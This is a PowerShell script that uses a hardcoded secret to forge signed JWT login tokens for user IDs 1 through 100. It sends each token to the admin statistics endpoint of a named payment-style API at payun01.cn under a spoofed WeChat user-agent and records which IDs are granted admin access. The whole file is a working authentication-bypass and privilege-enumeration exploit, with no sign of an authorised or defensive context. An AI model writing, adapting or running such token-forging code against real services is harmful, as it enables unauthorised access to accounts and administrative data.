param([string]$OutFile = "$env:TEMP\scan_result.txt")

$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$secret = 'a8f5f167f44f4964e6c998dee827110c3b2e3f9e8e6f5a4d3c2b1a0f9e8d7c6b5a4938271605f4e3d2c1b0a9f8e7d6c5b4a39281706f5e4d3c2b1a0'
$baseUrl = 'https://payun01.cn/api/v1'

function B64Url([byte[]]$bytes) {
  return [Convert]::ToBase64String($bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_')
}

function New-Jwt([int]$uid, [string]$sec) {
  $header = '{"alg":"HS256","typ":"JWT"}'
  $iat = [int][double]::Parse((Get-Date -UFormat %s))
  $payload = '{"userId":' + $uid + ',"iat":' + $iat + ',"exp":' + ($iat + 604800) + '}'
  $h = B64Url ([Text.Encoding]::UTF8.GetBytes($header))
  $p = B64Url ([Text.Encoding]::UTF8.GetBytes($payload))
  $hmac = New-Object System.Security.Cryptography.HMACSHA256
  $hmac.Key = [Text.Encoding]::UTF8.GetBytes($sec)
  $sig = B64Url ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($h + '.' + $p)))
  $hmac.Dispose()
  return $h + '.' + $p + '.' + $sig
}

$client = New-Object System.Net.Http.HttpClient
$client.Timeout = [TimeSpan]::FromSeconds(20)
$client.DefaultRequestHeaders.Add('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) MicroMessenger/8.0.49')

$log = New-Object System.Collections.Generic.List[string]
$log.Add('=== scan start ' + (Get-Date -Format s) + ' ===')

$found = @()
for ($uid = 1; $uid -le 100; $uid++) {
  $token = New-Jwt $uid $secret
  $msg = New-Object System.Net.Http.HttpRequestMessage('Get', "$baseUrl/admin/stats")
  $msg.Headers.TryAddWithoutValidation('Authorization', "Bearer $token") | Out-Null
  try {
    $resp = $client.SendAsync($msg).Result
    $code = [int]$resp.StatusCode
    $body = $resp.Content.ReadAsStringAsync().Result
    if ($code -ne 403 -or $body -notmatch 'permission') {
      $log.Add("uid=$uid HTTP=$code BODY=$($body.Substring(0, [Math]::Min(400, $body.Length)))")
    }
    if ($code -eq 200) { $found += $uid }
  } catch {
    $log.Add("uid=$uid EX=$($_.Exception.Message)")
  }
  $msg.Dispose()
}
$client.Dispose()

$log.Add('=== admin uids found: ' + ($(if ($found.Count) { $found -join ',' } else { 'NONE' })) + ' ===')
$log -join "`r`n" | Out-File -FilePath $OutFile -Encoding utf8
